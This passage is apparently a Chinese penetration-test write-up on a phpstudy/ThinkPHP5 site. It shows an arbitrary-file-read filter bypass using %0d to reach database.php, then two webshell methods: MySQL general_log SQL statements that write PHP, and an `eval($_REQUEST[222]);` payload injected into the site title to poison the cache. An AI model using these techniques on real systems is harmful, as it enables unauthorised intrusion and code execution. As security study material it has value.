**02**  
**任意文件读取漏洞过滤绕过**  
  
    通过扫描我们发现，该网站使用的是phpstudy（没有后门），还存在着一个phpmyadmin 页面，利用该页面可以操作数据库。但是，在这之前，我们需要获取数据库的连接账号密码。此处，利用任用文件读取漏洞，获取有两种可行方案。  
  
    一种是尝试读取名为database.php的数据库配置文件;另外一种是尝试读取mysql的user.MYD的数据文件，从中恢复出root的账号密码。phpstudy默认的user.MYD的存储位置为：phpStudy\\PHPTutorial\\MySQL\\data\\mysql\\user.MYD    读取后的内容如下：

![](../Images/c213409cede0b04fea8308b10c006a7e.png)  

    加密的方式是mysql5，但是，相关的密码hash无法解出。于是，我们尝试读取数据关键配置文件database.php。这时，却出现了一个很奇怪的问题：同目录下的其他php文件都能正常读取，但是唯独该文件读取的时候返回为空。（一般是因为该文件不存在）而直接在web上访问时，database.php返回为200。如果文件不存在，web访问时应该会报错；而如果读取时，文件权限不够，那么web访问时，权限也会存在问题，从而引发报错。由此可见，产生该问题的原因可能是存在一些WAF的过滤。  

  

    WAF的过滤一般在CDN层或者代码层实现。通过参考前期的自动化信息收集工具产生的文档，我们并没有发现相关网站存在CDN。于是，借助任意文件读取的漏洞，我们可以检验代码上的WAF的具体实现。


    在 RemoveXSS函数中，file=database.php中的base会被修改为`ba&lt;x&gt;se`，因此之前在使用任意文件读取的攻击载荷进行攻击时，读取的文件不是database.php，而是`databa&lt;x&gt;se.php`，该文件不存在，因此返回为空。如果仅仅是过滤base，我们可以利用windows环境下的php通配符进行绕过。例如此处我们想要读取的是database.php，我们可以写成`data>`或者`data<`的形式，通过通配符，我们可以在不写完整文件名的情况下读取到该database.php。遗憾的是，`<`以及`>`都会被RemoveXSS转义。  
   
    此外，我们注意到在RemoveXSS之后，还有一个RemoveWJ函数，我们可以利用该函数，绕过对base的过滤。在检查该函数后，我们发现，他会将%0d过滤为空，也就是会将传参中的所有%0d去除掉。因此，我们可以将原先传参中的database.php改写为databa%0dse.php，这样子一来，经过两个函数的过滤之后，我们最终可以成功读取到database.php。

**第一种getshell方式：  
mysql general log**

  

    虽然mysql server开启了secure file priv，无法使用load\_file 以及out intofile，但是仍然可以使用general log进行getshell。

*   查看general log的状态：show variables like "%general%";
    
*   开启general log，并把general log指向1.php：set global general\_log="ON"; set global general\_log\_file='xxxxx/1.php';
    
*   写shell：select "<?php phpinfo();?>" ;
    
*   写入后1.php中的内容：

**第二种getshell方式：  
thinkphp缓存getshell**

     

    首先，我们在我们本地部署了该套系统，在成功运行并访问后，我们观察到一个特殊的缓存文件的生成。缓存文件的位置在：

runtime\\cache\\xx\\xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.php

    缓存文件的内容如下所示：

![](../Images/6a68dad33eee39e3b5fc0a71c120eb5e.png)

    该缓存文件是tp5常见的序列化数据的方式，且缓存的存储类型为php，因此，一旦我们可以控制其中的内容，我们就能够实现任意代码执行的效果。  

  

    观察该文件的内容我们发现，该网站的title出现在该文件中，如果能够修改网站的title，我们就能实现任意代码执行。而title的修改功能位于后台，因此，我们需要先登录后台。由于我们已经掌握了数据库的权限，因此登录后台是轻而易举的。  

  

    登录后台后，我们修改title时加入攻击载荷。

`eval($_REQUEST[222]);`

    修改完成后，重新访问首页**（一定要重新访问哦）**，会触发缓存的更新，此时我们的shell已经写入到runtime\\cache\\xx\\xxxxxxxxxxxxxxxx.php中了。
